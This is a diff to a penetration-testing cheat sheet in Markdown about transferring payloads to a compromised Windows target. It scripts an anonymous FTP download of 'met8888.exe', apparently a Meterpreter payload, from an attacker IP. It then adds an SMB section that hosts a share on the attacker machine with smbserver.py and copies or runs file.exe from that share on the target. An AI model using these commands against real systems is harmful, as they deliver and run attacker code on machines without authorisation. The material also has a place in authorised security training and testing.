@@ -69,10 +69,32 @@ Can be kill with:
 
 Type it into your cmd.exe
 
->echo open <span style="color:blue">10.9.122.8</span>\>ftp_commands.txt  
+>echo open <span style="color:blue">your_ip_address</span>\>ftp_commands.txt  
 >echo anonymous>>ftp_commands.txt  
 >echo whatever>>ftp_commands.txt  
 >echo binary>>ftp_commands.txt  
 >echo get met8888.exe>>ftp_commands.txt  
 >echo bye>>ftp_commands.txt  
 ><span style="color:blue">ftp -s:ftp_commands.txt</span> 
+
+### <span style="color:green">SMB</span>
+
+**On attacker machine**:
+
+> smbserver.py shareName sharePath 
+> (e.g. smbserver.py TMP /tmp)
+
+Check with smbclient
+> smbclient -L \[your ip address\] --no-pass
+
+**On target machine**:
+or check on Windows
+> net view \\\[attack machine ip address\]
+
+Copy file 
+`copy \\\[your ip address\]\Sharepath .`
+
+Or execute the file directly from SMB
+`\\\[your ip address\]\file.exe`
+
+
